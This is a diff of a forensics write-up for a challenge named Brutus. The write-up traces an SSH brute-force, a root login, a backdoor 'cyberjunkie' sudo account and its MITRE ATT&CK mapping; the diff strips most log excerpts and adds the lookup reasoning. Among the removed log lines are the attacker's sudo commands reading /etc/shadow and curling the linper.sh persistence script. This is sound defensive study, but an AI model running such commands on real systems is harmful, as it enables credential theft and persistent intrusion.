@@ -60,29 +60,16 @@ The archive password is shown on the challenge download page, next to the file. 
 
 First, look inside the archive without extracting it:
 
-```bash
-7z l Brutus.zip
-```
-
 ![Content of Brutus.zip listed with 7z](screenshots/01-archive-listing.png)
 
 Three files: `auth.log` (43911 bytes), `wtmp` (11136 bytes) and `utmp.py` (3154 bytes). 7z also prints a warning about 1 byte of data after the end of the archive. It does not prevent extraction.
 
 `unzip` fails on this archive:
 
-```bash
-unzip -P <password> Brutus.zip
-# skipping: auth.log    unsupported compression method 99
-```
 
 ![unzip failing with compression method 99](screenshots/02-unzip-error.png)
 
 Method 99 means the archive is encrypted with AES, which `unzip` does not support. `7z` does:
-
-```bash
-7z x Brutus.zip -p'<password from the challenge page>' -o./Brutus_out -y
-ls -la Brutus_out/
-```
 
 ![Successful extraction with 7z](screenshots/03-extraction-ok.png)
 
@@ -124,13 +111,6 @@ I did not know yet which one was the attacker, so I moved on to `auth.log`.
 
 Reading `auth.log` with `cat`, most of the file is cron noise from the `confluence` user. The interesting part starts at 06:31:31, when many lines appear at once:
 
-```text
-Mar  6 06:31:31 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
-Mar  6 06:31:33 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
-Mar  6 06:31:37 sshd[2359]: Failed password for invalid user server_adm from 65.2.161.68 port 46596 ssh2
-Mar  6 06:31:38 sshd[2383]: Failed password for invalid user svc_account from 65.2.161.68 port 46722 ssh2
-Mar  6 06:31:39 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
-```
 
 ![Brute-force attempts from 65.2.161.68 in auth.log](screenshots/04-auth-log-bruteforce.png)
 
@@ -144,15 +124,10 @@ What I notice:
 
 ### 5.2 Compromised account
 
-```bash
-grep -i "ssh" auth.log
-```
 
 The first successful login from the attacker IP:
 
-```text
-Mar  6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
-```
+
 
 ![Accepted password for root from the attacker IP](screenshots/05-accepted-logins.png)
 
@@ -181,12 +156,7 @@ python3 utmp.py wtmp
 
 The last rows of the output:
 
-```text
-"USER"  "1583"  "pts/0"  "root"         "203.101.190.9"  "2024/03/06 01:19:55"
-"USER"  "2549"  "pts/1"  "root"         "65.2.161.68"    "2024/03/06 01:32:45"
-"DEAD"  "2491"  "pts/1"                                   "2024/03/06 01:37:24"
-"USER"  "2667"  "pts/1"  "cyberjunkie"  "65.2.161.68"    "2024/03/06 01:37:35"
-```
+
 
 ![wtmp parsed with utmp.py](screenshots/06-wtmp-utmp.png)
 
@@ -202,16 +172,6 @@ The challenge asks for the time of the terminal session, which is the `wtmp` val
 
 ### 5.5 Session number
 
-```bash
-grep -i "New session" auth.log | grep root
-```
-
-```text
-Mar  6 06:19:54 systemd-logind[411]: New session 6 of user root.
-Mar  6 06:31:40 systemd-logind[411]: New session 34 of user root.
-Mar  6 06:32:44 systemd-logind[411]: New session 37 of user root.
-```
-
 ![New session lines for root](screenshots/07-session-37.png)
 
 Session 6 is the administrator, session 34 is the automated login, and session 37 (06:32:44) is the attacker's manual session.
@@ -220,31 +180,11 @@ Session 6 is the administrator, session 34 is the automated login, and session 3
 
 ### 5.6 Persistence: the new account
 
-```bash
-grep -i "useradd" auth.log
-```
-
-```text
-Mar  6 06:34:18 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
-```
 
 ![useradd line creating cyberjunkie](screenshots/08-useradd.png)
 
 Then every line that mentions the new account:
 
-```bash
-grep -i "cyberjunkie" auth.log
-```
-
-```text
-06:34:18  groupadd   new group: name=cyberjunkie, GID=1002
-06:34:18  useradd    new user: name=cyberjunkie ... from=/dev/pts/1
-06:34:26  passwd     password changed for cyberjunkie
-06:34:31  chfn       changed user 'cyberjunkie' information
-06:35:15  usermod    add 'cyberjunkie' to group 'sudo'
-06:37:34  sshd       Accepted password for cyberjunkie from 65.2.161.68
-06:37:34  systemd-logind  New session 49 of user cyberjunkie
-```
 
 ![All log lines about cyberjunkie](screenshots/09-cyberjunkie-activity.png)
 
@@ -259,14 +199,6 @@ What this shows, step by step:
 
 ### 5.7 What the attacker did with the account
 
-```bash
-grep -i "sudo" auth.log
-```
-
-```text
-Mar  6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
-Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
-```
 
 ![sudo commands run by cyberjunkie](screenshots/10-sudo-commands.png)
 
@@ -277,7 +209,22 @@ The log only records the command. The script itself is not in the artifacts, so 
 
 ### 5.8 MITRE ATT&CK sub-technique
 
-The question asks for the sub-technique used for persistence by creating a new account. What the attacker did is run `useradd` to make a local account. I looked on the MITRE ATT&CK website for the technique that matches this and found:
+The question asks for the sub-technique used for persistence by creating a new account. The ID is not in the logs, so I looked it up on the MITRE ATT&CK website.
+
+```text
+Matrices > Enterprise > Persistence > Create Account (T1136) > Local Account (T1136.001)
+```
+![MITRE ATT&CK page for T1136 Create Account with its sub-techniques](screenshots/11-mitre-homepage.png)
+How I found it:
+
+1. The tactic is **Persistence**: the attacker wants to keep access to the server.
+2. The action is **creating an account**, which matches the technique **Create Account (T1136)**.
+3. The T1136 page lists three sub-techniques: Local Account, Domain Account and Cloud Account.
+
+![MITRE ATT&CK page for T1136 Create Account with its sub-techniques](screenshots/12-mitre-t1136.png)
+
+I chose the sub-technique by looking at what the log shows. The attacker ran `useradd` directly on the server (`from=/dev/pts/1`), so the account exists only on that machine. It is not a domain account (no Active Directory here) and not a cloud account. That makes it a local account.
+
 
 **T1136.001, Create Account: Local Account** (tactic: Persistence)
 
